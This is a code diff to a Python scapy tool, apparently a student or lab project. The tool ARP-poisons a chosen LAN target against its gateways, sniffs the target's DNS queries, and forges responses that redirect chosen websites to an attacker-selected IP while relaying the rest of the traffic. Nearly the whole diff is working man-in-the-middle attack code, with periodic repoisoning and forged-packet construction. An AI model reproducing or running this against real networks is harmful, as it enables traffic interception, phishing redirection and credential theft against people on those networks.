@@ -23,16 +23,18 @@ regex = re.compile(
 
 ### CONSTANTS ###
 
-REPOISON_TIME = int(20)
-END_POISON = int(200)
+END_POISON = int(200) # number of packets sent during repoisoning
+REPOISON_TIME = int(20) # interval of repoisoning
 
 
 ### FUNCTIONS ###
 
+# Main function that runs the DNS attack
 def dns_spoofing(gratuitious, verbose):
     if verbose:     
         conf.verb = 0 # make scapy verbose (no output)
 
+    # clear terminal and begin keeping track of previous displayed text for UI
     spoof.clear()
     previous_tuples = []
 
@@ -44,10 +46,11 @@ def dns_spoofing(gratuitious, verbose):
     previous_tuples.append(["Chosen attack: DNS Spoofing.", 0])
     previous_tuples.append(["----------------------------"])
 
+    # allow the user to choose an interface for the attack
     iface, previous_tuples = spoof.get_interface(previous_tuples)
-
     spoof.print_previous(previous_tuples, True)
 
+    # search for active hosts on the network
     active_hosts, previous_tuples = sh.search_hosts(iface, [])
 
     spoof.printf("")
@@ -55,9 +58,10 @@ def dns_spoofing(gratuitious, verbose):
     spoof.printf("Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
     previous_tuples.append(["Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1])
 
+    # get the target's ip and mac address from the user's input 
     target = spoof.validate_ip(active_hosts, [], previous_tuples)
 
-    # Get the IP addresses of the default gateways of the selected interface
+    # get the IP addresses of the default gateways of the selected interface
     gateways = {}
     GATEWAY_TOKEN = "ff:ff:ff:ff:ff:ff"
     for key, val in ni.gateways()["default"].items():
@@ -66,12 +70,16 @@ def dns_spoofing(gratuitious, verbose):
 
     for host in active_hosts:
         if host["ip"] in gateways:
+            # add the MAC addresses of the gateways
             gateways[host["ip"]] = host["mac"]
 
+            # check for other active hosts that have MAC addresses equal to a MAC address of a default gateway
+            # and add them to the gateways for spoofing
             for scnd_host in active_hosts:
                 if scnd_host["mac"] == host["mac"] and scnd_host["ip"] not in gateways:
                     gateways[scnd_host["ip"]] = scnd_host["mac"]
 
+    # remove gateways for which no MAC address was found
     for gw_ip, gw_mac in gateways.items():
         if gw_mac == GATEWAY_TOKEN:
             gateways.pop(gw_ip)                
@@ -81,6 +89,7 @@ def dns_spoofing(gratuitious, verbose):
     previous_tuples.append([to_print, 0])
     previous_tuples.append(["-" * len(to_print)])
 
+    # pick which websites to spoof and with what ip
     dns_hosts = choose_websites(active_hosts, previous_tuples).copy()
     
     spoof.clear()
@@ -94,27 +103,32 @@ def dns_spoofing(gratuitious, verbose):
     spoof.printf("")
     spoof.printf("Starting poisoning... (Use Ctrl+Z to stop and kill the program)", 4)
 
-    # Start ARP poisoning
+    # start ARP poisoning every combination of target and gateway
     my_addresses = sh.get_my_details(iface)
     for gw_ip, gw_mac in gateways.items():
         arp.one_way_arp_start(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface)
 
     spoof.printf("Poisoning initiated.", 4)
 
+    # run the main function for dns spoofing
     dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, END_POISON)
 
-    # end poisoning
+    # end ARP poisoning by unpoisoning the tables of all targets with the correct mac addresses of gateways
     for gw_ip, gw_mac in gateways.items():
         for host in active_hosts:
             if host['ip'] == gw_ip:
                 arp.one_way_arp_end(target["mac"], target["ip"], host['mac'], host['ip'], my_addresses['mac'], my_addresses['ip'], iface)
                 break
 
+# Function for inputting websites that should be dns poisoned
+#
+# @return a dictionary with url as keys and ip's as values
 def choose_websites(active_hosts, previous_tuples):
     
-    dns_hosts = {}
-    _iter = 0
-    continue1 = True
+    # initiate needed variables
+    dns_hosts = {} # dictionary to be returned
+    _iter = 0 # keeps track of current target's index
+    continue1 = True 
     continue2 = True
 
     previous_tuples.append(["Now you can choose which websites to spoof and with what IP out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):"])
@@ -127,11 +141,15 @@ def choose_websites(active_hosts, previous_tuples):
         spoof.clear()
         spoof.print_previous(previous_tuples, True)
 
+        # get the current chosen url
         url, continue1 = input_web("URL: ", _iter, True, active_hosts, previous_tuples)
         if continue1:
+            # get the current chosen ip 
             ip, continue2  = input_web(" IP: ", _iter, False, active_hosts, previous_tuples)
         _iter += 1
         if continue1 and continue2:
+            # add the url and ip to the dictionary
+            # with format www.{example.com} and {example.com}
             dns_hosts[url+"."] = ip
 
             if url[:4] == "www.":
@@ -145,35 +163,52 @@ def choose_websites(active_hosts, previous_tuples):
 
     return dns_hosts
 
+# Fucntion for getting the input for website url and corresponding ip's
+#
+# @return the input of the user and boolean value showing whether the program should continue choosing websites
 def input_web(eend, _iter, isURL, active_hosts, previous_tuples):
+    # get the user's ip
     res = spoof.inputf(previous_tuples, eend)
+
+    # on input for stopping the choosing of websites
     if res in ["d", "done"]:
         if _iter < 1:
+            # force the user to input the website, ip tuple if it is the first one
             spoof.printf("You chould choose at least one (URL, IP) pair!", 2)
             return input_web(eend, _iter, isURL, active_hosts, previous_tuples)
         else:
+            # otherwise return the input of the user and stop choosing
             return res, False
 
+    # user should input url
     if isURL:
         if not is_URL_valid(res):
+            # if the url is not valid => repeat this procedure
             spoof.printf("Invalid URL({})! Try again.".format(res), 2)
             return input_web(eend, _iter, isURL, active_hosts, previous_tuples)
         else:
+            # if the url is valid => return
             return res, True
+
+    # user should input ip         
     else:
+        # check for validity of the ip
         ip, valid = is_IP_valid(active_hosts, res)
         if not valid:
+            # if the ip is not valid => repeat this procedure
             spoof.printf("Invalid IP({})! Try again.".format(ip), 2)
             return input_web(eend, _iter, isURL, active_hosts, previous_tuples)
         else:
+            # if the ip is valid => return
             return ip, True
-
+# Function for checking if a URL is formatted correctly using regular expressions
 def is_URL_valid(string):
     return re.match(regex, "http://" + string) is not None
 
+# Function for checking if an ip formatted correctly and is part of the active hosts
 def is_IP_valid(active_hosts, ip_address):
     try:
-        # check if the ip is part of {active_hosts}
+        # check if the ip is part of the active hosts
         ip_address = active_hosts[int(ip_address) - 1]["ip"]
         return ip_address, True
     except:
@@ -188,75 +223,95 @@ def is_IP_valid(active_hosts, ip_address):
 
         return ip_address, True
 
+# Function for dns spoofing the connection between the target and the chosen urls
+#
+# @param dns_hosts  dictionary containing tuples for websites to spoof and with which ip
+# @param gratuitious whether the ARP poisoning should be silent (False) or all-out (True)
 def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, end_poison):
-        #last_poison_time = time.time() - REPOISON_TIME
-        #_filter = "udp and tcp"
-        #_filter = "host " + target["ip"]
+        # filter for sniffing only packets that are from/to the target
+        _filter = "host " + target["ip"]
 
+        # create a socket for sending the packets using scapy faster 
+        s2 = conf.L2socket(iface=iface)
+
+        # number of times to keep poisoning
         for i in range(end_poison):
-            # sniff for 1 packet that adheres to the {_filter}
-            sniff(prn=process_udp_pkt(target, iface, dns_hosts, my_addresses), store=0, timeout=REPOISON_TIME)   
+            # get all packets that adhere to the {_filter} for {REPOISON_TIME} seconds
+            # if a packet is found => process it using the function {process_pkt}
+            sniff(prn=process_pkt(target, iface, dns_hosts, my_addresses, gateways, s2), filter=_filter, store=0, timeout=REPOISON_TIME)   
             
             # {REPOISON_TIME} seconds have passed => should repoison
             repoison(my_addresses, gateways, target, iface, gratuitious)
 
+        # close the socket at the end of the procedure
+        s2.close()
+
+# Function for repoisong the arp table of the target for each gateway
 def repoison(my_addresses, gateways, target, iface, gratuitious):
     spoof.printf("Repoisoning", 4)
     for gw_ip, gw_mac in gateways.items():
         arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2, gratuitious)
 
-def process_udp_pkt(target, iface, dns_hosts, my_addresses):
-    def process_udp_pkt_inside(pkt): 
+# Function for proccessing sniffed packets
+#
+# @param s2 - the scapy socket on which packets should be sent
+def process_pkt(target, iface, dns_hosts, my_addresses, gateways, s2):
+    # inner function which gets the packet as parameter 
+    def process_pkt_inner(pkt): 
+        # check that the packet is at least Layer 3 packet
         if pkt.haslayer(IP):
+            # the packet is for the target and about one of the websites that should be spoofed
             if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
                 spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)
+
+                # build a spoofed response and return it to the target
                 resp_packet = build_dns_response_packet(pkt, dns_hosts[pkt[DNSQR].qname])
-                sendp(resp_packet, iface=iface)
-
+                s2.send(resp_packet)
+            
+            # the received packet is not for a website we care about
             elif pkt[IP].src == target['ip']:
-                pkt[Ether].dst = "52:54:00:12:35:00"
 
+                # unspoof the mac address to point to the gateway
+                for gw_ip, gw_mac in gateways.items():
+                    pkt[Ether].dst = gw_mac
+                    break
+
+                # delete the checksum and length fields of the IP layer if needed
                 if pkt.haslayer(IP):
                     del pkt[IP].len
                     del pkt[IP].chksum
 
+                # delete the checksum and length fields of the UDPl layer if needed
                 if pkt.haslayer(UDP):
                     del pkt[UDP].len
                     del pkt[UDP].chksum
 
-                try:
-                    # new_pkt = srp1(pkt, verbose=0, iface=iface, timeout=2)[0]
-                    # # if pkt.haslayer(DNS):
-                    # # else:
-                    # #     new_pkt = sr1(pkt, iface=iface)[0]
+                # send the packet through the socket 
+                # this function automatically recalculates the checksum and length fields of all needed layers
+                s2.send(pkt)
 
-                    # new_pkt[Ether].dst = target["mac"]
+    # call the inner function
+    return process_pkt_inner
 
-                    # if new_pkt.haslayer(IP):
-                    #     del new_pkt[IP].len
-                    #     del new_pkt[IP].chksum
-                    
-                    # if new_pkt.haslayer(UDP):
-                    #     del new_pkt[UDP].len
-                    #     del new_pkt[UDP].chksum
-
-                    # sendp(new_pkt, count=1, iface=iface)
-                    sendp(pkt, count=1, iface=iface)
-                except:
-                    pass
-
-    return process_udp_pkt_inside
-
+# Function that builds a reply packet to a dns request
+#
+# @param pkt - dns request packet
+# @param malicious_ip - ip that should be spoofed
+# @return the spoofed reply packet
 def build_dns_response_packet(pkt, malicious_ip):
+        # Layer 2 header
         eth = Ether(src = pkt[Ether].dst,
                     dst = pkt[Ether].src)
 
+        # Layer 3 header
         ip = IP(src = pkt[IP].dst,
                 dst = pkt[IP].src)
 
+        # Layer 4 header
         udp = UDP(dport = pkt[UDP].sport,
                   sport = pkt[UDP].dport)
 
+        # Layer 5 header
         dns = DNS(id = pkt[DNS].id,
                   qd = pkt[DNS].qd,
                   aa = 1,
@@ -269,8 +324,9 @@ def build_dns_response_packet(pkt, malicious_ip):
                   ar = DNSRR(
                         rrname = pkt[DNS].qd.qname,
                         type = 'A',
-                        ttl = 600,
+                        ttl = 690,
                         rdata = malicious_ip))
 
+        # assemble the packet
         new_pkt = eth / ip / udp / dns
         return new_pkt
